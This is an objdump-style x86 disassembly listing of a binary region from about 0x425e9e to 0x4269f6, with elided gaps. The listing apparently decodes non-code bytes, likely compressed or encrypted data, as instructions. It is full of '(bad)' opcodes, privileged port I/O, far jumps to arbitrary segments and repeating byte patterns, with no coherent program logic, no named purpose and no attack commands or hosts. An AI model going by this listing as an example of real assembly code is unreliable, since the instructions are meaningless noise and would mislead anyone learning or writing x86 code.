  425e9e:	fistp  QWORD PTR [esi]
  425ea0:	and    al,0xe2
  425ea2:	mov    bl,0x9b
  425ea4:	jle    0x425e5d
  425ea6:	aas    
  425ea7:	test   eax,0x5823e831
  425eac:	pop    esi
  425ead:	mov    ebx,DWORD PTR [eax]
  425eaf:	sub    edx,DWORD PTR [edx+edi*8+0x5b]
  425eb3:	pop    ds
  425eb4:	out    0xd1,al
  425eb6:	cmp    al,0xea
  425eb8:	rcr    BYTE PTR [ecx-0x9],0x6b
  425ebc:	call   0xe7a1dcae
  425ec1:	in     al,0x0
	...
  425f33:	add    BYTE PTR [ebx+0x16],cl
  425f36:	int    0x41
  425f38:	fstp   st(3)
  425f3a:	iret   
  425f3b:	push   ds
  425f3c:	lock leave 
  425f3e:	jmp    DWORD PTR [ecx+0x26]
  425f41:	mov    BYTE PTR [ebx-0x19],bl
  425f44:	jo     0x425eda
  425f46:	add    DWORD PTR [eax],eax
  425f48:	test   BYTE PTR [eax],0x0
  425f4b:	add    BYTE PTR [edx],dh
  425f4d:	in     eax,0x31
  425f4f:	push   ds
  425f50:	out    dx,eax
  425f51:	xor    eax,DWORD PTR cs:[ebp+0x675eea44]
  425f58:	scas   eax,DWORD PTR es:[edi]
  425f59:	pusha  
  425f5a:	mov    DWORD PTR [edx],0xe0911fc5
  425f60:	cmc    
  425f61:	f2xm1  
  425f63:	out    0x3,al
  425f65:	pop    ss
  425f66:	cs xor ch,dl
  425f69:	call   0x9b4585a4
  425f6e:	in     eax,dx
  425f6f:	loop   0x425f4e
  425f71:	or     eax,0xffffff99
  425f74:	fimul  DWORD PTR [edx+0x7f]
  425f77:	or     al,0x35
  425f79:	jp     0x425f05
  425f7b:	xor    ebx,edi
  425f7d:	(bad)  
  425f7e:	adc    bl,BYTE PTR [edx+0x7b]
  425f81:	cmc    
  425f82:	das    
  425f83:	add    eax,0xf24bc8b6
  425f88:	mov    bh,bh
  425f8a:	jo     0x425fda
  425f8c:	loop   0x425ff2
  425f8e:	dec    edx
  425f8f:	mov    cl,0x9c
  425f91:	mov    DWORD PTR ds:0x565e29f5,edi
  425f97:	inc    edx
  425f98:	push   esi
  425f99:	mov    dh,0x5b
  425f9b:	pop    ebx
  425f9c:	lock pop ss
  425f9e:	inc    esi
  425f9f:	push   ss
  425fa0:	stos   BYTE PTR es:[edi],al
  425fa1:	out    dx,al
  425fa2:	jnp    0x425f3a
  425fa4:	aas    
  425fa5:	jb     0x425f42
  425fa7:	jnp    0x425fde
  425fa9:	cmp    bh,BYTE PTR [bx+0x440]
  425fae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425faf:	inc    BYTE PTR [ecx]
  425fb1:	shr    DWORD PTR [ebx-0x963178],0x8f
  425fb8:	adc    DWORD PTR [edx],ecx
  425fba:	cmp    al,ch
  425fbc:	xor    al,0x9e
  425fbe:	xchg   edx,eax
  425fbf:	push   ebx
  425fc0:	sar    BYTE PTR [ebp+eax*8+0x7a],0xb6
  425fc5:	daa    
  425fc6:	bound  eax,QWORD PTR [edx]
  425fc8:	pop    ebp
  425fc9:	adc    BYTE PTR [ebp-0x42b5c1bb],bh
  425fcf:	outs   dx,BYTE PTR ds:[esi]
  425fd0:	mov    ds:0xbbe889cf,eax
  425fd5:	jns    0x42601f
  425fd7:	pop    ds
  425fd8:	retf   
  425fd9:	call   0xe95e:0xc8deee6e
  425fe0:	lea    esp,[edi+ebp*2+0x20]
  425fe4:	mov    WORD PTR [edx],ds
  425fe6:	mov    ecx,0x9001d83b
  425feb:	call   0xa49b:0x5f3b6a84
  425ff2:	xchg   ebx,eax
  425ff3:	cmp    DWORD PTR [ecx+0x15],ebx
  425ff6:	mov    edx,0xce8cfa9a
  425ffb:	ds test al,0xc3
  425ffe:	dec    dx
  426000:	sbb    al,0x6b
  426002:	mov    bh,dl
  426004:	pop    eax
  426005:	xchg   ebp,eax
  426006:	enter  0x7fc5,0x1f
  42600a:	adc    ah,cl
  42600c:	dec    esp
  42600d:	mov    WORD PTR [edx-0x30ea6a33],?
  426013:	pop    esp
  426014:	outs   dx,BYTE PTR ds:[esi]
  426015:	push   ds
  426016:	rcl    ah,1
  426018:	jae    0x425fd6
  42601a:	cmp    al,0x67
  42601c:	xor    al,0xc2
  42601e:	jmp    0xfb03:0x9d3bf14a
  426025:	mov    dh,0x38
  426027:	xchg   ah,dh
  426029:	dec    edi
  42602a:	xchg   ecx,eax
  42602b:	addr16 js 0x4260a8
  42602e:	mov    esp,0xe8cba6cc
  426033:	jb     0x42603f
  426035:	inc    ebx
  426036:	dec    esp
  426037:	mov    BYTE PTR [ebx-0x46],ch
  42603a:	ficom  DWORD PTR ds:0xf8112c23
  426040:	scas   al,BYTE PTR es:[edi]
  426041:	push   esi
	...
  4260b2:	add    BYTE PTR [eax],al
  4260b4:	ficom  WORD PTR [ecx]
  4260b6:	lahf   
  4260b7:	and    ebx,edi
  4260b9:	scas   eax,DWORD PTR es:[edi]
  4260ba:	(bad)  
  4260bb:	std    
  4260bc:	sub    al,0x28
  4260be:	pop    ds
  4260bf:	mov    eax,ds:0xecf9eb54
  4260c4:	xchg   bp,ax
  4260c6:	add    DWORD PTR [eax],eax
  4260c8:	test   BYTE PTR [eax],0x0
  4260cb:	add    BYTE PTR [ebx+0x34d013c8],bh
  4260d1:	dec    ebx
  4260d2:	ret    0x4125
  4260d5:	pop    ecx
  4260d6:	(bad)  
  4260d7:	push   edx
  4260d8:	or     BYTE PTR [ebp+0x74],cl
  4260db:	inc    esi
  4260dc:	sbb    al,0x1a
  4260de:	imul   edi,DWORD PTR [ecx-0x79df7c96],0xffffffd5
  4260e5:	mov    ds:0x913c13d6,al
  4260ea:	cmc    
  4260eb:	cwde   
  4260ec:	into   
  4260ed:	bound  edx,QWORD PTR [ebx+0x9]
  4260f0:	leave  
  4260f1:	enter  0xf71a,0x49
  4260f5:	dec    ebp
  4260f6:	adc    BYTE PTR [esi-0x61],al
  4260f9:	adc    esi,ebp
  4260fb:	jecxz  0x426098
  4260fd:	(bad)  
  4260fe:	lds    ebp,FWORD PTR [ebx]
  426100:	sub    al,0x7c
  426102:	int3   
  426103:	outs   dx,BYTE PTR ds:[esi]
  426104:	scas   al,BYTE PTR es:[edi]
  426105:	push   es
  426106:	dec    ebx
  426107:	and    BYTE PTR [edx],bh
  426109:	sbb    BYTE PTR [edx+0x4a],bl
  42610c:	and    eax,eax
  42610e:	xchg   edi,eax
  42610f:	cmc    
  426110:	mov    ecx,?
  426112:	test   edi,0x95c4a827
  426118:	push   ds
  426119:	scas   eax,DWORD PTR es:[edi]
  42611a:	hlt    
  42611b:	ss int3 
  42611d:	gs push es
  42611f:	scas   al,BYTE PTR es:[edi]
  426120:	fwait
  426121:	mov    bh,BYTE PTR [edi]
  426123:	lds    esi,FWORD PTR [ecx+0x125b6508]
  426129:	mov    BYTE PTR ds:0x1ba91e23,0xe0
  426130:	aas    
  426131:	push   eax
  426132:	jno    0x426157
  426134:	push   ds
  426135:	loope  0x426137
  426137:	mov    eax,0xdaa820fc
  42613c:	xchg   esp,eax
  42613d:	sbb    dh,al
  42613f:	(bad)  
  426140:	fisub  WORD PTR [eax+0x48e97990]
  426146:	(bad)  
  426147:	pop    ss
  426148:	ficomp WORD PTR [ebx-0x3b]
  42614b:	test   al,0x6a
  42614d:	out    0xae,al
  42614f:	push   edi
  426150:	ins    DWORD PTR es:[edi],dx
  426151:	(bad)  
  426152:	std    
  426153:	push   ebp
  426154:	scas   al,BYTE PTR es:[edi]
  426155:	jbe    0x42612e
  426157:	jo     0x426146
  426159:	cmc    
  42615a:	dec    esi
  42615b:	adc    eax,0x16436075
  426160:	add    edi,ebp
  426162:	sahf   
  426163:	out    0x1a,al
  426165:	fwait
  426166:	out    0x8f,eax
  426168:	aaa    
  426169:	call   0xfd2f1ac7
  42616e:	inc    esi
  42616f:	or     BYTE PTR [edi],dh
  426171:	daa    
  426172:	ret    0x1352
  426175:	mov    edx,0x7ee053d4
  42617a:	push   edx
  42617b:	xchg   ebx,eax
  42617c:	lea    edx,[eax+eiz*2+0x0]
  426180:	mov    ebp,0x60f0f6a3
  426185:	and    eax,0xd0ba8c9a
  42618a:	sbb    al,0x80
  42618c:	mov    ah,0x38
  42618e:	ret    0xa95e
  426191:	jmp    0x7f3a:0x12531aae
  426198:	loope  0x426218
  42619a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42619b:	retf   0xdf3d
  42619e:	mov    ch,bh
  4261a0:	test   eax,0x986c14b2
  4261a5:	sbb    DWORD PTR [esi],ecx
  4261a7:	mov    WORD PTR [ebp+edi*1-0x64],es
  4261ab:	push   ebx
  4261ac:	and    ecx,ecx
  4261ae:	pop    eax
  4261af:	imul   BYTE PTR [esi-0x79]
  4261b2:	mov    bl,0x48
  4261b4:	and    al,0x3c
  4261b6:	mov    cl,0x3d
  4261b8:	adc    eax,0x1fc59a63
  4261bd:	ficomp WORD PTR ds:0xe3c44c
	...
  426233:	add    BYTE PTR [esp+eax*8-0x84318d],ch
  42623a:	mov    ebp,0xdfb43ee6
  42623f:	push   0xffffffdf
  426241:	xor    dh,BYTE PTR [edi-0x78]
  426244:	pop    esp
  426245:	xchg   esi,eax
  426246:	add    DWORD PTR [eax],eax
  426248:	test   BYTE PTR [eax],0x0
  42624b:	add    al,ah
  42624d:	xchg   esi,eax
  42624e:	fsub   DWORD PTR ss:[ebx+eax*1-0x3f]
  426253:	sbb    BYTE PTR [edx],0x7c
  426256:	and    eax,0x75787130
  42625b:	push   cs
  42625c:	int    0x93
  42625e:	push   cs
  42625f:	test   al,0x24
  426261:	loopne 0x4262da
  426263:	retf   0xc530
  426266:	mov    dl,0xee
  426268:	scas   al,BYTE PTR es:[edi]
  426269:	and    al,0x9f
  42626b:	or     DWORD PTR [ebp-0x66a37ca8],eax
  426271:	inc    esp
  426272:	ja     0x42629c
  426274:	xor    al,0x11
  426276:	pop    esp
  426277:	xchg   edi,eax
  426278:	mov    eax,0x43459130
  42627d:	xor    ch,BYTE PTR [ebp+0x13]
  426280:	xchg   eax,esp
  426282:	inc    esi
  426283:	push   edi
  426284:	imul   edx,eax,0x33
  426287:	fisubr WORD PTR [edi]
  426289:	psraw  mm5,mm7
  42628c:	mov    ebp,0x7bafd061
  426291:	mov    esp,0x24b4817c
  426296:	in     al,0x50
  426298:	test   DWORD PTR [ebx],ebp
  42629a:	shl    DWORD PTR [edx-0x4079bdad],1
  4262a0:	mov    ah,0x80
  4262a2:	cmp    al,0x88
  4262a4:	int3   
  4262a5:	xchg   esi,eax
  4262a6:	cwde   
  4262a7:	mov    bl,ch
  4262a9:	stos   BYTE PTR es:[edi],al
  4262aa:	adc    dh,BYTE PTR [edx]
  4262ac:	fst    DWORD PTR [eax+ebx*1]
  4262af:	mov    edx,0xaa9b4fc2
  4262b4:	std    
  4262b5:	mov    dh,0xb5
  4262b7:	sahf   
  4262b8:	push   eax
  4262b9:	mov    ds:0xf93159e2,al
  4262be:	push   0x5ca3da56
  4262c3:	loopne 0x426280
  4262c5:	stc    
  4262c6:	popa   
  4262c7:	pop    ecx
  4262c8:	ss and eax,ecx
  4262cb:	jo     0x4262f0
  4262cd:	mov    esi,0xb063da86
  4262d2:	bsr    esp,DWORD PTR [edx]
  4262d5:	popa   
  4262d6:	mov    ds:0xb6b9aaba,eax
  4262db:	aas    
  4262dc:	xchg   esi,eax
  4262dd:	adc    eax,0x847c57f
  4262e2:	(bad)  [edi+eax*4+0x3f4f4f5e]
  4262e9:	mov    bl,0xa1
  4262eb:	in     al,dx
  4262ec:	leave  
  4262ed:	in     eax,0xc4
  4262ef:	cmc    
  4262f0:	xchg   esp,eax
  4262f1:	and    al,BYTE PTR [ebx+0x67]
  4262f4:	test   bh,cl
  4262f6:	mov    edx,0xaccdb96
  4262fb:	jmp    0x2c3d8b36
  426300:	test   DWORD PTR [ecx],ebp
  426302:	pop    ebp
  426303:	into   
  426304:	cmp    BYTE PTR [esi],dl
  426306:	ds popf 
  426308:	add    dl,ah
  42630a:	mov    ecx,0x1d34c3c8
  42630f:	xchg   esi,eax
  426310:	dec    ebp
  426311:	ds ins BYTE PTR es:[edi],dx
  426313:	xchg   edx,eax
  426314:	xor    al,0xf3
  426316:	mov    cl,0xf2
  426318:	dec    DWORD PTR fs:[eax+0x7]
  42631c:	push   0x9374b098
  426321:	or     esp,ecx
  426323:	adc    esp,DWORD PTR [eax]
  426325:	sbb    BYTE PTR [ebp-0x7901143f],bh
  42632b:	lds    ebx,FWORD PTR [ebx]
  42632d:	xchg   edi,eax
  42632e:	pop    ebx
  42632f:	xor    edi,DWORD PTR [ebx-0x46bfb581]
  426335:	push   cs
  426336:	call   0xbe8f:0x3c977ecf
  42633d:	fisub  DWORD PTR cs:[edi]
  426340:	ins    BYTE PTR es:[edi],dx
  426341:	popa   
	...
  4263b2:	add    BYTE PTR [eax],al
  4263b4:	inc    edx
  4263b5:	or     esp,eax
  4263b7:	test   eax,0xeb6fedcf
  4263bc:	(bad)  
  4263be:	mov    dh,0xba
  4263c0:	mov    eax,edx
  4263c2:	shl    DWORD PTR [edx+edx*2],cl
  4263c5:	xchg   edi,eax
  4263c6:	add    DWORD PTR [eax],eax
  4263c8:	test   BYTE PTR [eax],0x0
  4263cb:	add    BYTE PTR [edi-0x33ef1252],dl
  4263d1:	outs   dx,DWORD PTR ds:[esi]
  4263d2:	add    ebx,ecx
  4263d4:	fwait
  4263d5:	push   es
  4263d6:	stos   DWORD PTR es:[edi],eax
  4263d7:	cmp    eax,eax
  4263d9:	in     eax,0xaa
  4263db:	rol    cl,0xb4
  4263de:	cwde   
  4263df:	dec    esp
  4263e0:	mov    ds:0x1a6e0d3a,al
  4263e5:	sbb    DWORD PTR ds:0x47ff497d,ebp
  4263eb:	(bad)  
  4263ec:	arpl   WORD PTR [edi+ebx*1+0x3],si
  4263f0:	pop    ds
  4263f1:	adc    DWORD PTR [ecx+esi*2],ebx
  4263f4:	outs   dx,BYTE PTR ds:[esi]
  4263f5:	pop    ss
  4263f6:	lea    ecx,[esi+0x1cc272e5]
  4263fc:	fsubr  QWORD PTR [ebx+eiz*8-0x4]
  426400:	fwait
  426401:	lods   al,BYTE PTR ds:[esi]
  426402:	mov    eax,ds:0x1cb10953
  426407:	inc    ebx
  426408:	ficom  WORD PTR [ebx+0x2213eee3]
  42640e:	push   ds
  42640f:	out    dx,eax
  426410:	push   ss
  426411:	ficomp WORD PTR [ebp+0x42]
  426414:	fidiv  DWORD PTR [ecx+0x77]
  426417:	(bad)  
  426418:	aas    
  426419:	jmp    0xd59a:0x927b2cf1
  426420:	mov    dl,0x2c
  426422:	xor    eax,0x72eb5449
  426427:	inc    esi
  426428:	cli    
  426429:	mov    DWORD PTR ss:[ebp+0x152b320f],esp
  426430:	add    ch,BYTE PTR [edi-0xb]
  426433:	and    eax,eax
  426435:	xchg   ebx,eax
  426436:	push   esi
  426437:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426438:	das    
  426439:	inc    ebx
  42643a:	je     0x4264b7
  42643c:	dec    eax
  42643d:	in     al,dx
  42643e:	lea    esi,ds:0x81e5d921
  426444:	cmc    
  426445:	jbe    0x4264a8
  426447:	mov    al,cl
  426449:	push   0xfc4d7c21
  42644e:	icebp  
  42644f:	not    BYTE PTR [ebp+ebp*8-0x33]
  426453:	push   eax
  426454:	mov    esi,0x8958a30e
  426459:	sbb    edi,0x5630fae3
  42645f:	sbb    dh,BYTE PTR [edi+0x39]
  426462:	(bad)  
  426463:	mov    eax,ds:0xcff10681
  426468:	dec    edx
  426469:	xchg   DWORD PTR [edi],ecx
  42646b:	das    
  42646c:	inc    esp
  42646d:	scas   eax,DWORD PTR es:[edi]
  42646e:	pop    ebp
  42646f:	in     eax,dx
  426470:	inc    eax
  426471:	sub    DWORD PTR [edx],edi
  426473:	not    BYTE PTR [ecx-0x6d]
  426476:	test   BYTE PTR [esi-0x5472b9ed],ch
  42647c:	(bad)  
  42647d:	pop    eax
  42647e:	loopne 0x4264de
  426480:	js     0x426496
  426482:	retf   0x3364
  426485:	je     0x4264f6
  426487:	rol    DWORD PTR ds:0x75de3ac9,0x53
  42648e:	xor    eax,0x737d0e9b
  426493:	lock sbb bl,0x4
  426497:	add    al,0x9c
  426499:	push   0xa18abe18
  42649e:	(bad)  
  42649f:	cmp    al,0x25
  4264a1:	mov    ds:0x8d50fdd6,al
  4264a6:	pop    esi
  4264a7:	pop    ebx
  4264a8:	xchg   BYTE PTR [edi-0x67],ch
  4264ab:	mov    BYTE PTR [ebp+0x3d8b5fad],0xda
  4264b2:	(bad)  
  4264b3:	inc    edi
  4264b4:	fist   DWORD PTR [esi-0x74a71cde]
  4264ba:	xor    DWORD PTR [edx+eiz*1],0xb2d03238
  4264c1:	mov    ah,0x0
	...
  426533:	add    ah,al
  426535:	jmp    0xfef4:0xfe6e7a4e
  42653c:	loop   0x42656c
  42653e:	dec    ebx
  42653f:	pop    esp
  426540:	fs cdq 
  426542:	cmp    eax,0x1984867
  426547:	add    dh,dh
  426549:	add    BYTE PTR [eax],al
  42654b:	add    ah,dl
  42654d:	into   
  42654e:	sbb    al,0xd1
  426550:	xor    dh,0xdd
  426553:	add    DWORD PTR gs:[ebx],esp
  426556:	imul   edx,DWORD PTR [eax-0x2a],0x5cd94b6c
  42655d:	jl     0x4265c8
  42655f:	js     0x4265d4
  426561:	out    dx,al
  426562:	or     eax,0xb02dfb67
  426567:	es xchg ah,dl
  42656a:	leave  
  42656b:	sub    dl,bh
  42656d:	xchg   BYTE PTR [esi+eax*4],dh
  426570:	add    BYTE PTR [eax],dl
  426572:	mov    edi,0x293d5251
  426577:	das    
  426578:	ja     0x4265c5
  42657a:	jl     0x4265ca
  42657c:	in     eax,dx
  42657d:	es sbb eax,0xbe2796bd
  426583:	pop    ebp
  426584:	call   0x4cd5664a
  426589:	imul   esi,DWORD PTR [ecx+0x50af3ea0],0x5a
  426590:	xor    DWORD PTR [ebp+0x695c3dcd],0x44
  426597:	xor    DWORD PTR [ebp+0x711ef522],0xffffff8a
  42659e:	push   edi
  42659f:	add    cl,dh
  4265a1:	mov    eax,0x5ffbea26
  4265a6:	sbb    DWORD PTR [ebp-0x3d6d5696],eax
  4265ac:	dec    ecx
  4265ad:	mul    DWORD PTR [edi+0x1d]
  4265b0:	and    al,0x82
  4265b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4265b3:	out    dx,eax
  4265b4:	mov    dh,0xba
  4265b6:	pop    esi
  4265b7:	lds    ebx,FWORD PTR [ebx-0x3e020966]
  4265bd:	push   ecx
  4265be:	adc    DWORD PTR [esi-0x6b102b68],ebx
  4265c4:	aaa    
  4265c5:	or     eax,0x44e5c4df
  4265ca:	mov    bl,0x4
  4265cc:	xchg   ebp,eax
  4265cd:	js     0x426574
  4265cf:	mov    ch,0x8f
  4265d1:	(bad)  
  4265d2:	adc    bh,BYTE PTR ds:0x42d16934
  4265d8:	xchg   ebx,eax
  4265d9:	cs das 
  4265db:	test   DWORD PTR [esi+0x1c],0x9b3cd08b
  4265e2:	cmp    DWORD PTR [esi+0x23],esi
  4265e5:	lods   eax,DWORD PTR ds:[esi]
  4265e6:	xrelease xchg BYTE PTR ds:0xd590dc4f,cl
  4265ed:	adc    dl,BYTE PTR ds:0x6740fd7c
  4265f3:	sub    eax,0x6508ac56
  4265f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4265f9:	dec    esi
  4265fa:	das    
  4265fb:	retf   
  4265fc:	pmaddwd mm5,mm2
  4265ff:	(bad)  
  426601:	and    BYTE PTR [ecx+0x1f2a67f0],ah
  426607:	cwde   
  426608:	addr16 imul ebx,ebp,0xffffffd6
  42660c:	jb     0x42667e
  42660e:	cs xor eax,0xe5401283
  426614:	pop    ds
  426615:	jb     0x426675
  426617:	loopne 0x42668f
  426619:	sub    edi,DWORD PTR [esi+0x40120877]
  42661f:	mov    ebp,0x9b67cbd8
  426624:	mov    esp,0xd5603a8
  426629:	dec    ebp
  42662a:	loopne 0x4265c6
  42662c:	popa   
  42662d:	shr    BYTE PTR [edi],1
  42662f:	pop    eax
  426630:	(bad)  
  426631:	stc    
  426632:	mov    ebp,0x1f8feb98
  426637:	dec    ebx
  426638:	les    esp,FWORD PTR ss:[ebp-0x2332a83c]
  42663f:	dec    ebp
  426640:	inc    esp
  426641:	icebp  
	...
  4266b2:	add    BYTE PTR [eax],al
  4266b4:	(bad)  
  4266b5:	aaa    
  4266b6:	shl    BYTE PTR [ebx+esi*8],cl
  4266b9:	cmc    
  4266ba:	div    bh
  4266bc:	rcl    ah,cl
  4266be:	inc    esi
  4266bf:	pop    edi
  4266c0:	bound  eax,QWORD PTR [ebp+0x48]
  4266c3:	xor    DWORD PTR [esi],edi
  4266c5:	cdq    
  4266c6:	add    DWORD PTR [eax],eax
  4266c8:	test   BYTE PTR [eax],0x0
  4266cb:	add    BYTE PTR [esi],al
  4266cd:	xchg   edx,eax
  4266ce:	(bad)  
  4266cf:	mov    BYTE PTR [ebx],al
  4266d1:	mov    eax,ds:0x5095f4f5
  4266d6:	push   cs
  4266d7:	xor    eax,0x1a176a95
  4266dc:	dec    edx
  4266dd:	xchg   ebp,eax
  4266de:	inc    ebp
  4266df:	sti    
  4266e0:	pop    edi
  4266e1:	stc    
  4266e2:	sbb    WORD PTR [eax-0x23],ax
  4266e6:	in     al,0x30
  4266e8:	xor    edi,DWORD PTR [edi-0x6]
  4266eb:	sbb    al,0xaa
  4266ed:	jmp    0x4266e9
  4266ef:	inc    ebp
  4266f0:	add    BYTE PTR [edi-0x61],ah
  4266f3:	cmp    al,dl
  4266f5:	icebp  
  4266f6:	add    al,0x30
  4266f8:	push   esp
  4266f9:	adc    BYTE PTR [ecx-0x75],al
  4266fc:	mov    al,ds:0xb26fef2a
  426701:	in     al,dx
  426702:	aad    0x8b
  426704:	xor    ch,0xab
  426707:	out    dx,eax
  426708:	mov    esi,eax
  42670a:	push   ecx
  42670b:	inc    ebx
  42670c:	sahf   
  42670d:	xor    ebx,edi
  42670f:	(bad)  
  426710:	out    0xb1,al
  426712:	in     eax,dx
  426713:	shr    BYTE PTR [eax],1
  426715:	test   edi,esi
  426717:	adc    DWORD PTR [ecx+0x19],edi
  42671a:	je     0x426769
  42671c:	lahf   
  42671d:	bound  edx,QWORD PTR [esi]
  42671f:	sub    al,0xc1
  426721:	lock push ss
  426723:	inc    BYTE PTR [edi+edi*2+0x45ab4bcd]
  42672a:	mov    edx,0xe3689c47
  42672f:	mov    dh,BYTE PTR [ebx-0x5fdcd1be]
  426735:	sbb    eax,0x52177ac9
  42673a:	fwait
  42673b:	loopne 0x426763
  42673d:	and    eax,0xab5ec55c
  426742:	sbb    eax,0xf70f4e93
  426747:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426748:	mov    DWORD PTR [esi-0xd],ebx
  42674b:	and    BYTE PTR [ecx+0x520a13a2],cl
  426751:	mov    BYTE PTR [edx+0x6457fceb],ah
  426757:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426758:	sub    ebp,ebx
  42675a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42675b:	jno    0x4267ac
  42675d:	fiadd  DWORD PTR [ebx+0x6ce8117f]
  426763:	pop    ds
  426764:	mov    esp,0x50412137
  426769:	fdivp  st(5),st
  42676b:	and    bh,bl
  42676d:	ss addr16 and ch,bl
  426771:	inc    esp
  426772:	push   esp
  426773:	mov    ch,0x1f
  426775:	push   ecx
  426776:	rcr    ebp,cl
  426778:	(bad)  
  426779:	or     DWORD PTR [ebp+0x3a81e6fe],esi
  42677f:	mov    ebp,0xa5d8e182
  426784:	jns    0x4267d9
  426786:	sbb    bl,BYTE PTR [edx-0x4de50535]
  42678c:	ret    0x6179
  42678f:	dec    esp
  426790:	dec    BYTE PTR [edx+0x3]
  426793:	test   DWORD PTR [ebp+0x12ad0238],ecx
  426799:	mov    edi,0x4005c01b
  42679e:	adc    al,0xd0
  4267a0:	enter  0xb086,0x5a
  4267a4:	jo     0x4267d6
  4267a6:	mov    eax,DWORD PTR [eax-0x32]
  4267a9:	call   0xad286b3d
  4267ae:	mov    esp,0xa1ccfa42
  4267b3:	xor    BYTE PTR gs:[ecx+edi*1-0x1b],dh
  4267b8:	sub    DWORD PTR [ecx+esi*2+0x57f9968a],ecx
  4267bf:	fwait
  4267c0:	popa   
  4267c1:	push   cs
	...
  426832:	add    BYTE PTR [eax],al
  426834:	pop    esp
  426835:	push   edx
  426836:	nop
  426837:	push   edx
  426838:	sahf   
  426839:	rcr    dh,cl
  42683b:	pop    esi
  42683c:	test   BYTE PTR [esi+edi*8+0x6c521234],cl
  426843:	pop    edx
  426844:	xor    al,0x9a
  426846:	add    DWORD PTR [eax],eax
  426848:	test   BYTE PTR [eax],0x0
  42684b:	add    BYTE PTR [ebx-0x7309545c],cl
  426851:	jl     0x426853
  426853:	stc    
  426854:	and    al,0xda
  426856:	mov    al,dl
  426858:	adc    al,0x7a
  42685a:	(bad)  
  42685b:	push   eax
  42685c:	mov    db6,ecx
  42685f:	push   cs
  426860:	sub    ebp,esi
  426862:	fmulp  st(7),st
  426864:	out    0xbe,al
  426866:	jbe    0x4268e4
  426868:	lds    esp,FWORD PTR [eax]
  42686a:	push   ds
  42686b:	sbb    BYTE PTR [edx],ah
  42686d:	fnstenv [edx]
  42686f:	xchg   ch,cl
  426871:	scas   eax,DWORD PTR es:[edi]
  426872:	or     bh,BYTE PTR [edi]
  426874:	repz jmp 0x42a4bfc5
  42687a:	out    0xb2,eax
  42687c:	dec    edi
  42687d:	xchg   edx,edx
  42687f:	push   eax
  426880:	adc    al,0xe1
  426882:	rcl    DWORD PTR [edx+edi*4],0xb8
  426886:	dec    esi
  426887:	das    
  426888:	test   al,0xa5
  42688a:	(bad)  
  42688b:	lods   eax,DWORD PTR ds:[esi]
  42688c:	js     0x426896
  42688e:	push   ss
  42688f:	repnz adc eax,DWORD PTR [ecx+eiz*1+0x41cc5372]
  426897:	jbe    0x426917
  426899:	add    dl,BYTE PTR [edi-0x24]
  42689c:	sub    ah,dl
  42689e:	rcl    ah,cl
  4268a0:	cmc    
  4268a1:	adc    edi,edx
  4268a3:	fwait
  4268a4:	jg     0x426915
  4268a6:	(bad)  
  4268a7:	repz bound edx,QWORD PTR [edx]
  4268aa:	inc    ecx
  4268ab:	sar    BYTE PTR [eax+0x2a],0x7a
  4268af:	out    0x26,al
  4268b1:	std    
  4268b2:	jo     0x4268da
  4268b4:	shl    DWORD PTR [ecx],cl
  4268b6:	xchg   ecx,eax
  4268b7:	jecxz  0x426890
  4268b9:	clc    
  4268ba:	daa    
  4268bb:	inc    edx
  4268bc:	not    DWORD PTR [ebp-0xb]
  4268bf:	fadd   st,st(1)
  4268c1:	out    dx,eax
  4268c2:	xor    al,0xf2
  4268c4:	cmp    al,0x20
  4268c6:	jecxz  0x426856
  4268c8:	rcl    esp,1
  4268ca:	cmp    eax,0x17af996d
  4268cf:	jmp    0x2432:0x59f6e645
  4268d6:	xchg   DWORD PTR [eax-0x3],ebx
  4268d9:	lahf   
  4268da:	fisttp QWORD PTR [edi+ecx*2]
  4268dd:	mov    WORD PTR [ebp+0x10],es
  4268e0:	mov    cl,0x6a
  4268e2:	pop    ss
  4268e3:	neg    BYTE PTR ds:0xeb6c8e64
  4268e9:	mov    edx,0x33c540e0
  4268ee:	mov    cl,0x71
  4268f1:	mov    bl,BYTE PTR [ebp+0xd]
  4268f4:	mov    al,ds:0x4711d6a0
  4268f9:	in     eax,0xa5
  4268fb:	push   edi
  4268fc:	sub    al,0x3e
  4268fe:	aas    
  4268ff:	and    BYTE PTR [ebp+0x1aa83232],dl
  426905:	fistp  DWORD PTR [esi-0x26]
  426908:	jns    0x426986
  42690a:	imul   BYTE PTR [ecx+0x4b523f71]
  426910:	mov    al,ds:0x78982b5e
  426915:	xlat   BYTE PTR ds:[ebx]
  426916:	sahf   
  426917:	mov    al,BYTE PTR [ebp-0x29ee6cc0]
  42691d:	jl     0x4268ee
  42691f:	jmp    0x29df:0x7819421a
  426926:	(bad)
  426929:	arpl   WORD PTR [eax+0x3558c004],cx
  42692f:	int    0x15
  426931:	jnp    0x42695f
  426933:	ret    0x5eb0
  426936:	xchg   bl,dh
  426938:	or     eax,0xbd4ea1b7
  42693d:	aaa    
  42693e:	jo     0x42699c
  426940:	call   0x0:0xe4
	...
  4269b3:	add    cl,al
  4269b5:	arpl   WORD PTR [edi+eiz*2],ax
  4269b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4269b9:	jcxz   0x4269a3
  4269bc:	jne    0x426978
  4269be:	push   ebp
  4269bf:	inc    esp
  4269c0:	data16 (bad) 
  4269c2:	adc    BYTE PTR [ecx+0x2a],bh
  4269c5:	fwait
  4269c6:	add    DWORD PTR [eax],eax
  4269c8:	test   BYTE PTR [eax],0x0
  4269cb:	add    BYTE PTR [ecx+0x73],ah
  4269ce:	cld    
  4269cf:	mov    dh,0x83
  4269d1:	les    eax,FWORD PTR [eax+0x370063e3]
  4269d7:	into   
  4269d8:	push   ss
  4269d9:	(bad)  
  4269da:	popf   
  4269db:	repz scas al,BYTE PTR es:[edi]
  4269dd:	add    al,0xba
  4269df:	cmc    
  4269e0:	push   cs
  4269e1:	scas   eax,DWORD PTR es:[edi]
  4269e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269e3:	das    
  4269e4:	mov    eax,ds:0x96620950
  4269e9:	xor    eax,0xf4e4c828
  4269ee:	inc    eax
  4269ef:	fistp  QWORD PTR [ebp-0x66]
  4269f2:	ja     0x4269d8
  4269f4:	ror    DWORD PTR [ecx],cl
  4269f6:	mov    al,0xbe
